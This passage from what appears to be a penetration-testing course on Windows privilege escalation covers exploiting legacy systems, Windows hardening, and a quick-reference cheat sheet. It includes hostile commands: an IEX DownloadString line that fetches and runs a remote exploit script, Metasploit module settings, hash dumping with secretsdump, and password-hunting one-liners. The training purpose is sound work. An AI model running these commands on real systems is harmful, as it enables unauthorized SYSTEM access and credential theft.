1. Right-click hhupd.exe → Run as administrator
2. Click "Show information about the publisher's certificate"
3. In General tab, click the Issued By hyperlink
4. Browser opens as SYSTEM
5. View page source → Save as → C:\Windows\System32\cmd.exe

### Scheduled Tasks
```cmd
schtasks /query /fo LIST /v
Get-ScheduledTask | select TaskName,State
```

Check folder write access:
```cmd
accesschk64.exe /accepteula -s -d C:\Scripts\
```

### User/Computer Description
```powershell
Get-LocalUser
Get-WmiObject -Class Win32_OperatingSystem | select Description
```

### Mounting VHDX/VMDK

Linux:
```bash
guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk
guestmount --add WEBSRV10.vhdx --ro /mnt/vhdx/ -m /dev/sda1
```

Windows:
```powershell
Mount-VHD -Path C:\path\to\disk.vhdx
```

Extract hashes:
```bash
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
```

---

## 28. Legacy Operating Systems

### End-of-Life (EOL) Dates

| Version | EOL Date |
|---|---|
| Windows XP | April 8, 2014 |
| Windows Vista | April 11, 2017 |
| Windows 7 | January 14, 2020 |
| Windows 8 | January 12, 2016 |
| Windows 8.1 | January 10, 2023 |
| Server 2003 | April 8, 2014 |
| Server 2008 | January 14, 2020 |
| Server 2008 R2 | January 14, 2020 |
| Server 2012 | October 10, 2023 |
| Server 2012 R2 | October 10, 2023 |
| Server 2016 | January 12, 2027 |
| Server 2019 | January 9, 2029 |

### Why Legacy Systems Are a Problem
- No more security updates
- New CVEs remain unpatched
- Wormable flaws (MS08-067, MS17-010)
- Large attack surface

### Pentester Considerations
- Get client approval before attacking
- Understand business reasons for legacy systems
- Suggest network segmentation

### Windows Server 2008 R2 Exploitation

Sherlock:
```powershell
Import-Module .\Sherlock.ps1
Find-AllVulns
```

Windows-Exploit-Suggester:
```bash
python2 windows-exploit-suggester.py --update
python2 windows-exploit-suggester.py --database <db>.xls --systeminfo <systeminfo>.txt
```

MS10-092 (Task Scheduler):
```
use exploit/windows/local/ms10_092_schelevator
set SESSION 1
set LHOST <IP>
set LPORT 4443
exploit
```

### Windows 7 Exploitation

MS16-032 (Secondary Logon):
```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
IEX(New-Object Net.WebClient).DownloadString('http://<IP>:8080/Invoke-MS16-032.ps1')
Invoke-MS16-032
```

---

## 29. Windows Hardening

### Secure Clean OS Installation
- Use a clean ISO
- Include only required applications
- Test updates before deployment
- Remove bloatware

### Updates and Patching
- Windows Update Orchestrator handles updates
- Reboot regularly
- Use WSUS for enterprise environments
- Test before enterprise-wide rollout

### Configuration Management
- Use Group Policy (GPMC)
- Manage user and computer settings
- Enforce security settings

### User Management
- Limit user/admin accounts
- Monitor login attempts
- Enforce strong password policy
- Enable 2FA/MFA
- Rotate passwords
- Remove excessive group memberships

### Audit
- Use DISA STIGs
- Microsoft Security Compliance Toolkit
- Compliance frameworks: ISO27001, PCI-DSS, HIPAA
- Regular security and configuration checks

### Logging
- Sysmon — detailed process/network/file logging
- Network logs — PacketBeat, IDS/IPS
- Ship logs to SIEM
- Sysmon logs stored in:
```
Applications and Service Logs\Microsoft\Windows\Sysmon\Operational
```

### Key Hardening Measures
- Enable Secure Boot and BitLocker
- Audit writable files/directories
- Use absolute paths in scheduled tasks
- Never store cleartext credentials in world-readable files
- Clean up home directories and PowerShell history
- Restrict low-priv users from modifying custom libraries
- Remove unnecessary packages and services
- Enable Device Guard and Credential Guard
- Use Group Policy for configuration enforcement

---

## 30. Quick Reference Cheat Sheet

### Enumeration Commands

| Command | Purpose |
|---|---|
| whoami /priv | Show current privileges |
| whoami /groups | Show group memberships |
| net user | List local users |
| net localgroup administrators | List admin group members |
| systeminfo | OS version and patches |
| wmic qfe | List installed hotfixes |
| tasklist /svc | Running processes and services |
| netstat -ano | Active network connections |
| sc qc <service> | Query service config |
| schtasks /query /fo LIST /v | List scheduled tasks |

### Privilege Escalation Commands

| Command | Purpose |
|---|---|
| accesschk.exe -quvcw <service> | Check service permissions |
| SharpUp.exe audit | Find privesc vectors |
| PowerUp.ps1 → Invoke-AllChecks | Find privesc vectors |
| reg query HKLM\...\Winlogon | Check AutoLogon |
| cmdkey /list | List saved credentials |
| takeown /f <file> | Take ownership of file |
| icacls <file> /grant <user>:F | Grant full control |

### Credential Hunting Commands

| Command | Purpose |
|---|---|
| findstr /SIM /C:"password" *.txt *.ini *.config | Search files for passwords |
| gc (Get-PSReadLineOption).HistorySavePath | Read PowerShell history |
| Get-ChildItem C:\ -Recurse -Include *.kdbx | Find KeePass databases |
| netsh wlan show profile <name> key=clear | Show Wi-Fi password |

### Exploitation Tools

| Tool | Purpose |
|---|---|
| JuicyPotato | SeImpersonate privesc (pre-1809) |
| PrintSpoofer | SeImpersonate privesc (post-1809) |
| MS16-032 | Secondary Logon privesc |
| MS10-092 | Task Scheduler privesc |
| ExploitCapcom | Capcom.sys driver exploit |
| HiveNightmare | SAM/SYSTEM hash dump |
| PrintNightmare | Print Spooler privesc |
| SharpChrome | Browser credential extraction |
| LaZagne | All-in-one credential harvester |
| SessionGopher | Remote access tool credentials |

### Key Attack Paths

| Vector | Escalation |
|---|---|
| SeImpersonatePrivilege | JuicyPotato/PrintSpoofer → SYSTEM |
| SeDebugPrivilege | LSASS dump → credentials |
| SeBackupPrivilege | Read any file, dump SAM/NTDS |
| SeTakeOwnershipPrivilege | Own any object → full control |
| SeLoadDriverPrivilege | Load vulnerable driver → SYSTEM |
| Weak service permissions | Change binPath → SYSTEM |
| AlwaysInstallElevated | Malicious MSI → SYSTEM |
| UAC bypass | Auto-elevating binary + DLL hijack |
| Kernel exploit | MS16-032, MS10-092, etc. |
| Vulnerable service | Druva inSync → SYSTEM |
| Credential theft | Sticky Notes, history, configs |
| Legacy OS | MS08-067, MS17-010, MS16-032 |

---

## Conclusion

This module covered the complete Windows privilege escalation lifecycle:

1. **Enumeration** — Understanding the system, finding flaws
2. **Exploitation** — Abusing privileges, misconfigurations, and vulnerabilities
3. **Credential Theft** — Harvesting credentials from many sources
4. **Pillaging** — Extracting valuable information
5. **Hardening** — Defending against these attacks

### Key Principles
- Enumeration is iterative — revisit overlooked details
- Tools help, but manual skills are essential
- Always understand the "why" before attacking
- Get client approval for destructive actions
- Clean up after yourself
- Document everything

### Defense-in-Depth
- Patch regularly
- Use Group Policy to enforce security
- Enable advanced protections (Credential Guard, Device Guard, BitLocker)
- Monitor with Sysmon and SIEM
- Audit against STIGs and compliance frameworks
- Train staff continuously
